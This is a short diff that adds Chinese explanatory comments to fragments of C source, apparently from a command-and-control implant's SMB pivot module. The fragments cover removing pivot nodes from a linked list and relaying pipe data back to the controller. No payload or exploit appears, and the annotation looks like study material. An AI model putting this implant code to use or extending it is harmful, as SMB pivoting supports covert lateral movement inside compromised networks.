@@ -132,6 +132,7 @@ PPIVOT_DATA PivotGet( DWORD AgentID )
     return Counter;
 }
 
+// 从链表中删除指定节点并释放内存
 BOOL PivotRemove( DWORD AgentId )
 {
     PRINTF( "Remove pivot %x", AgentId )
@@ -143,6 +144,7 @@ BOOL PivotRemove( DWORD AgentId )
     if ( ( ! TempList ) || ( ! PivotData ) )
         return FALSE;
 
+    // 如果需要删除的是当前节点，那么进行断链并释放内存
     if ( Instance.SmbPivots->DemonID == AgentId )
     {
         PPIVOT_DATA TempNext = Instance.SmbPivots->Next;
@@ -226,6 +228,9 @@ DWORD PivotCount()
     return Counter;
 }
 
+// 通过管道接收SMB的数据并回传
+// 如果管道被关闭了，那么就从链表中删除对应节点，并返回断开连接的消息
+// 如果是其他的错误，那么就返回错误消息
 VOID PivotPush()
 {
     PPACKAGE    Package   = NULL;
@@ -297,6 +302,7 @@ VOID PivotPush()
                         return;
                     }
 
+                    // 回传错误信息，并释放
                     CALLBACK_GETLASTERROR
                     PackageDestroy( Package );
 
